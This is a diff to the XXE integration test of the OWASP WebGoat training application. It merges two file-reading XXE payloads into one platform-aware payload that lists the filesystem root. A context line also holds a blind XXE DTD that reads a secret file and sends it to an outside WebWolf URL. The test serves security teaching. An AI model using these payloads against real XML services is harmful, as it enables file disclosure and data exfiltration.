@@ -7,18 +7,22 @@ package org.owasp.webgoat.integration;
 import io.restassured.RestAssured;
 import io.restassured.http.ContentType;
 import java.io.IOException;
+import java.nio.file.Path;
+import org.apache.commons.lang3.SystemUtils;
 import org.junit.jupiter.api.Test;
 
 public class XXEIntegrationTest extends IntegrationTest {
 
-  private static final String xxe3 =
+  // Windows runners can use a working drive other than the Windows system drive.
+  private static final String rootUri =
+      SystemUtils.IS_OS_WINDOWS
+          ? Path.of(System.getenv("SystemRoot")).getRoot().toUri().toString()
+          : "file:///";
+
+  private static final String directoryListing =
       """
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
-""";
-  private static final String xxe4 =
-      """
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
-""";
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "%s">]><comment><text>&xxe;test</text></comment>
+""".formatted(rootUri);
   private static final String dtd7 =
       """
 <?xml version="1.0" encoding="UTF-8"?><!ENTITY % file SYSTEM "file:SECRET"><!ENTITY % all "<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>">%all;
@@ -45,8 +49,8 @@ public class XXEIntegrationTest extends IntegrationTest {
   //        .get(url("service/enable-security.mvc"))
   //        .then()
   //        .statusCode(200);
-  //    checkAssignment(url("xxe/simple"), ContentType.XML, xxe3, false);
-  //    checkAssignment(url("xxe/content-type"), ContentType.XML, xxe4, false);
+  //    checkAssignment(url("xxe/simple"), ContentType.XML, directoryListing, false);
+  //    checkAssignment(url("xxe/content-type"), ContentType.XML, directoryListing, false);
   //    checkAssignment(
   //        url("xxe/blind"),
   //        ContentType.XML,
@@ -109,8 +113,8 @@ public class XXEIntegrationTest extends IntegrationTest {
   public void runTests() throws IOException {
     startLesson("XXE", true);
     webGoatHomeDirectory = webGoatServerDirectory();
-      checkAssignment(webGoatUrlConfig.url("xxe/simple"), ContentType.XML, xxe3, true);
-      checkAssignment(webGoatUrlConfig.url("xxe/content-type"), ContentType.XML, xxe4, true);
+    checkAssignment(webGoatUrlConfig.url("xxe/simple"), ContentType.XML, directoryListing, true);
+    checkAssignment(webGoatUrlConfig.url("xxe/content-type"), ContentType.XML, directoryListing, true);
       checkAssignment(
               webGoatUrlConfig.url("xxe/blind"),
         ContentType.XML,
